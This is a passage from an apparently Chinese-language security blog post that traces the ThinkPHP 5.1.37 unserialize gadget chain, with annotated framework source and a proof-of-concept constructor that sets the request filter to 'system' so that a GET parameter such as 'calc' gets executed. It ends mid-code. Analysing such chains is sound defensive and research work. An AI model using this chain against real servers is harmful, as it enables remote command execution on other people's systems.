<li><p>准备参数：使用<code>array_unshift($args, $this)</code>将当前对象实例<code>$this</code>插入参数数组的开头</p>
</li>
<li><p>动态调用：使用<code>call_user_func_array()</code>调用存储在hook中的回调函数</p>
</li>
</ol>
<p>这里 $this-&gt;hook可控，所以要在这里构造$hook&#x3D; {“visable”&#x3D;&gt;”任意method”}</p>
<p>最后调用情况</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">call_user_func_array([<span class="variable">$obj</span>,<span class="string">&quot;任意方法&quot;</span>],[<span class="variable">$this</span>,任意参数])</span><br><span class="line">也就是</span><br><span class="line"><span class="variable">$obj</span>-&gt;<span class="variable">$func</span>(<span class="variable">$this</span>,<span class="variable">$argv</span>)</span><br></pre></td></tr></table></figure>

<p>Request类中有一个特殊的功能就是过滤器 filter，该方法存在命令执行函数，所以可以尝试覆盖filter的方法去执行代码</p>
<p>找到函数<code>private function filterValue(&amp;$value, $key, $filters)</code>，但是没法直接利用，参数不可控，向上寻找调用</p>
<p><img src="https://blog-abc.oss-cn-beijing.aliyuncs.com/image/image-3.png"></p>
<p>寻找使用了过滤器的所有方法，发现input()函数</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">public <span class="keyword">function</span> input(<span class="variable">$data</span> = [], <span class="variable">$name</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$default</span> = null, <span class="variable">$filter</span> = <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">false</span> === <span class="variable">$name</span>) &#123;</span><br><span class="line">        // 获取原始数据</span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$name</span> = (string) <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&#x27;&#x27;</span> != <span class="variable">$name</span>) &#123;</span><br><span class="line">        // 解析name</span><br><span class="line">        <span class="keyword">if</span> (strpos(<span class="variable">$name</span>, <span class="string">&#x27;/&#x27;</span>)) &#123;</span><br><span class="line">            list(<span class="variable">$name</span>, <span class="variable">$type</span>) = explode(<span class="string">&#x27;/&#x27;</span>, <span class="variable">$name</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$this</span>-&gt;getData(<span class="variable">$data</span>, <span class="variable">$name</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_null(<span class="variable">$data</span>)) &#123;</span><br><span class="line">            <span class="built_in">return</span> <span class="variable">$default</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_object(<span class="variable">$data</span>)) &#123;</span><br><span class="line">            <span class="built_in">return</span> <span class="variable">$data</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 解析过滤器</span><br><span class="line">    <span class="variable">$filter</span> = <span class="variable">$this</span>-&gt;getFilter(<span class="variable">$filter</span>, <span class="variable">$default</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (is_array(<span class="variable">$data</span>)) &#123;</span><br><span class="line">        array_walk_recursive(<span class="variable">$data</span>, [<span class="variable">$this</span>, <span class="string">&#x27;filterValue&#x27;</span>], <span class="variable">$filter</span>);</span><br><span class="line">        <span class="keyword">if</span> (version_compare(PHP_VERSION, <span class="string">&#x27;7.1.0&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>)) &#123;</span><br><span class="line">            // 恢复PHP版本低于 7.1 时 array_walk_recursive 中消耗的内部指针</span><br><span class="line">            <span class="variable">$this</span>-&gt;arrayReset(<span class="variable">$data</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;filterValue(<span class="variable">$data</span>, <span class="variable">$name</span>, <span class="variable">$filter</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (isset(<span class="variable">$type</span>) &amp;&amp; <span class="variable">$data</span> !== <span class="variable">$default</span>) &#123;</span><br><span class="line">        // 强制类型转换</span><br><span class="line">        <span class="variable">$this</span>-&gt;typeCast(<span class="variable">$data</span>, <span class="variable">$type</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里input函数的控制点也不好构造，继续查找调用input方法的的函数</p>
<p><img src="https://blog-abc.oss-cn-beijing.aliyuncs.com/image/image-4.png"></p>
<p>找到param函数调用了input函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">param</span>(<span class="params"><span class="variable">$name</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$default</span> = <span class="literal">null</span>, <span class="variable">$filter</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;mergeParam) &#123;</span><br><span class="line">        <span class="variable">$method</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">method</span>(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 自动获取请求变量</span></span><br><span class="line">        <span class="keyword">switch</span> (<span class="variable">$method</span>) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">                <span class="variable">$vars</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">post</span>(<span class="literal">false</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;PUT&#x27;</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;DELETE&#x27;</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;PATCH&#x27;</span>:</span><br><span class="line">                <span class="variable">$vars</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">put</span>(<span class="literal">false</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="variable">$vars</span> = [];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 当前请求参数和URL地址中的参数合并</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;param = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$this</span>-&gt;param, <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="literal">false</span>), <span class="variable">$vars</span>, <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">route</span>(<span class="literal">false</span>));</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;mergeParam = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">true</span> === <span class="variable">$name</span>) &#123;</span><br><span class="line">        <span class="comment">// 获取包含文件上传信息的数组</span></span><br><span class="line">        <span class="variable">$file</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">file</span>();</span><br><span class="line">        <span class="variable">$data</span> = <span class="title function_ invoke__">is_array</span>(<span class="variable">$file</span>) ? <span class="title function_ invoke__">array_merge</span>(<span class="variable">$this</span>-&gt;param, <span class="variable">$file</span>) : <span class="variable language_">$this</span>-&gt;param;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">input</span>(<span class="variable">$data</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$default</span>, <span class="variable">$filter</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">input</span>(<span class="variable">$this</span>-&gt;param, <span class="variable">$name</span>, <span class="variable">$default</span>, <span class="variable">$filter</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>不过参数仍然是不可控的，所以我们继续找调用param函数的地方。找到了isAjax函数</p>
<p><img src="https://blog-abc.oss-cn-beijing.aliyuncs.com/image/image-5.png"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isAjax</span>(<span class="params"><span class="variable">$ajax</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$value</span>  = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">server</span>(<span class="string">&#x27;HTTP_X_REQUESTED_WITH&#x27;</span>);</span><br><span class="line">    <span class="variable">$result</span> = <span class="string">&#x27;xmlhttprequest&#x27;</span> == <span class="title function_ invoke__">strtolower</span>(<span class="variable">$value</span>) ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">true</span> === <span class="variable">$ajax</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$result</span>           = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">param</span>(<span class="variable">$this</span>-&gt;config[<span class="string">&#x27;var_ajax&#x27;</span>]) ? <span class="literal">true</span> : <span class="variable">$result</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;mergeParam = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在isAjax函数中，我们可以控制<code>$this-&gt;config[&#39;var_ajax&#39;]</code>，<code>$this-&gt;config[&#39;var_ajax&#39;]</code>可控就意味着param函数中的<code>$name</code>可控，</p>
<p>OK，这里回溯到input（）函数，<code>$name</code>的值来自于<code>$this-&gt;config[&#39;var_ajax&#39;]</code>，这里先分析一下$data &#x3D; $this-&gt;getData($data, $name);和$filter &#x3D; $this-&gt;getFilter($filter, $default);函数</p>
<p><img src="https://blog-abc.oss-cn-beijing.aliyuncs.com/image/image-6.png"></p>
<p>$data &#x3D; $this-&gt;getData($data, $name);</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getData</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$data</span>, <span class="variable">$name</span></span>)  //<span class="title">name</span>=$<span class="title">this</span>-&gt;<span class="title">config</span>[&#x27;<span class="title">var_ajax</span>&#x27;]</span></span><br></pre></td></tr></table></figure>

<p>这里<code>$data</code> &#x3D; <code>$data[$val]</code> &#x3D; <code>$data[$name]</code></p>
<p>$filter &#x3D; $this-&gt;getFilter($filter, $default);</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getFilter</span>(<span class="params"><span class="variable">$filter</span>, <span class="variable">$default</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$filter</span>)) &#123;</span><br><span class="line">        <span class="variable">$filter</span> = [];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$filter</span> = <span class="variable">$filter</span> ?: <span class="variable language_">$this</span>-&gt;filter; <span class="comment">//$filter来自于$this-&gt;filter</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$filter</span>) &amp;&amp; <span class="literal">false</span> === <span class="title function_ invoke__">strpos</span>(<span class="variable">$filter</span>, <span class="string">&#x27;/&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$filter</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$filter</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$filter</span> = (<span class="keyword">array</span>) <span class="variable">$filter</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$filter</span>[] = <span class="variable">$default</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$filter</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>这里的<code>$filter</code>来自于<code>$this-&gt;filter</code>，我们需要定义一个带有<code>$this-&gt;filter</code>的函数</p>
<p><img src="/./PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94ThinkPHP5.1.37%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E8%B7%AF%E6%9E%84%E9%80%A0/image-7-1758516216785-4.png"></p>
<ul>
<li><input disabled="" type="checkbox"> tip：对于上面这张图这个细节点，我还没get到</li>
</ul>
<h2 id="梳理一下整个调用链路"><a href="#梳理一下整个调用链路" class="headerlink" title="梳理一下整个调用链路"></a>梳理一下整个调用链路</h2><p>toArray()方法创建了一个Request()对象，然后会触发poc里的<code>__construct()</code>方法，接着<code>new Request()-&gt; visible($name)</code>，该对象调用了一个不存在的方法会触发<code>__call</code>方法，看一下<code>__construct()</code>方法内容：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;        </span><br><span class="line">    <span class="variable language_">$this</span>-&gt;filter = <span class="string">&quot;system&quot;</span>;        </span><br><span class="line">    <span class="variable language_">$this</span>-&gt;config = [<span class="string">&quot;var_ajax&quot;</span>=&gt;<span class="string">&#x27;lin&#x27;</span>];        </span><br><span class="line">    <span class="variable language_">$this</span>-&gt;hook = [<span class="string">&quot;visible&quot;</span>=&gt;[<span class="variable language_">$this</span>,<span class="string">&quot;isAjax&quot;</span>]];    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public <span class="keyword">function</span> __call(<span class="variable">$method</span>, <span class="variable">$args</span>) //method =visable ,args is array。//<span class="variable">$method</span>为不存在方法，<span class="variable">$args</span>为不存在方法以数组形式存的参数，此时<span class="variable">$method</span> = visible，<span class="variable">$args</span> = <span class="variable">$name</span> = [<span class="string">&quot;calc.exe&quot;</span>,<span class="string">&quot;calc&quot;</span>]</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (array_key_exists(<span class="variable">$method</span>, <span class="variable">$this</span>-&gt;hook)) &#123;</span><br><span class="line">        array_unshift(<span class="variable">$args</span>, <span class="variable">$this</span>);//将新元素插入到数组<span class="variable">$args</span>中，此时<span class="variable">$args</span> = [<span class="variable">$this</span>,<span class="string">&quot;calc.exe&quot;</span>,<span class="string">&quot;calc&quot;</span>]</span><br><span class="line">        <span class="built_in">return</span> call_user_func_array(<span class="variable">$this</span>-&gt;hook[<span class="variable">$method</span>], <span class="variable">$args</span>); //执行回调函数isAjax, ([<span class="variable">$this</span>,isAjax],[<span class="variable">$this</span>,<span class="string">&quot;calc.exe&quot;</span>,<span class="string">&quot;calc&quot;</span>])</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    throw new Exception(<span class="string">&#x27;method not exists:&#x27;</span> . static::class . <span class="string">&#x27;-&gt;&#x27;</span> . <span class="variable">$method</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接着看isAjax方法的调用过程，</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isAjax</span>(<span class="params"><span class="variable">$ajax</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$value</span>  = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">server</span>(<span class="string">&#x27;HTTP_X_REQUESTED_WITH&#x27;</span>);</span><br><span class="line">    <span class="variable">$result</span> = <span class="string">&#x27;xmlhttprequest&#x27;</span> == <span class="title function_ invoke__">strtolower</span>(<span class="variable">$value</span>) ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">true</span> === <span class="variable">$ajax</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$result</span>           = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">param</span>(<span class="variable">$this</span>-&gt;config[<span class="string">&#x27;var_ajax&#x27;</span>]) ? <span class="literal">true</span> : <span class="variable">$result</span>;<span class="comment">//这里$this-&gt;config[&#x27;var_ajax&#x27;] = &#x27;lin&#x27;</span></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;mergeParam = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进入param（）方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 获取当前请求的参数</span></span><br><span class="line"><span class="comment">* <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span>  mixed         $name 变量名</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span>  mixed         $default 默认值</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span>  string|array  $filter 过滤方法</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">param</span>(<span class="params"><span class="variable">$name</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$default</span> = <span class="literal">null</span>, <span class="variable">$filter</span> = <span class="string">&#x27;&#x27;</span></span>)//$<span class="title">name</span> = $<span class="title">this</span>-&gt;<span class="title">config</span>[&#x27;<span class="title">var_ajax</span>&#x27;] = &#x27;<span class="title">lin</span>&#x27;</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;mergeParam) &#123;</span><br><span class="line">        <span class="variable">$method</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">method</span>(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 自动获取请求变量</span></span><br><span class="line">        <span class="keyword">switch</span> (<span class="variable">$method</span>) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">                <span class="variable">$vars</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">post</span>(<span class="literal">false</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;PUT&#x27;</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;DELETE&#x27;</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;PATCH&#x27;</span>:</span><br><span class="line">                <span class="variable">$vars</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">put</span>(<span class="literal">false</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="variable">$vars</span> = [];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 当前请求参数和URL地址中的参数合并</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;param = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$this</span>-&gt;param, <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="literal">false</span>), <span class="variable">$vars</span>, <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">route</span>(<span class="literal">false</span>));</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;mergeParam = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">true</span> === <span class="variable">$name</span>) &#123;</span><br><span class="line">        <span class="comment">// 获取包含文件上传信息的数组</span></span><br><span class="line">        <span class="variable">$file</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">file</span>();</span><br><span class="line">        <span class="variable">$data</span> = <span class="title function_ invoke__">is_array</span>(<span class="variable">$file</span>) ? <span class="title function_ invoke__">array_merge</span>(<span class="variable">$this</span>-&gt;param, <span class="variable">$file</span>) : <span class="variable language_">$this</span>-&gt;param;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">input</span>(<span class="variable">$data</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$default</span>, <span class="variable">$filter</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">input</span>(<span class="variable">$this</span>-&gt;param, <span class="variable">$name</span>, <span class="variable">$default</span>, <span class="variable">$filter</span>);<span class="comment">//$this-&gt;param当前get请求参数数组(&#x27;lin&#x27; =&gt; &#x27;calc&#x27;)、$name = $this-&gt;config[&#x27;var_ajax&#x27;] = lin</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分析input()方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取变量 支持过滤和默认值</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  array         $data 数据源</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  string|false  $name 字段名</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  mixed         $default 默认值</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  string|array  $filter 过滤函数</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">input</span>(<span class="params"><span class="variable">$data</span> = [], <span class="variable">$name</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$default</span> = <span class="literal">null</span>, <span class="variable">$filter</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;<span class="comment">////当前请求参数数组&#x27;lin&#x27;=&gt;&#x27;calc&#x27;、$name = $this-&gt;config[&#x27;var_ajax&#x27;]=lin</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">false</span> === <span class="variable">$name</span>) &#123;</span><br><span class="line">        <span class="comment">// 获取原始数据</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$name</span> = (<span class="keyword">string</span>) <span class="variable">$name</span>;<span class="comment">//指定lin为字符串</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&#x27;&#x27;</span> != <span class="variable">$name</span>) &#123;</span><br><span class="line">        <span class="comment">// 解析name</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$name</span>, <span class="string">&#x27;/&#x27;</span>)) &#123;</span><br><span class="line">            <span class="keyword">list</span>(<span class="variable">$name</span>, <span class="variable">$type</span>) = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;/&#x27;</span>, <span class="variable">$name</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$data</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getData</span>(<span class="variable">$data</span>, <span class="variable">$name</span>);<span class="comment">//$data = 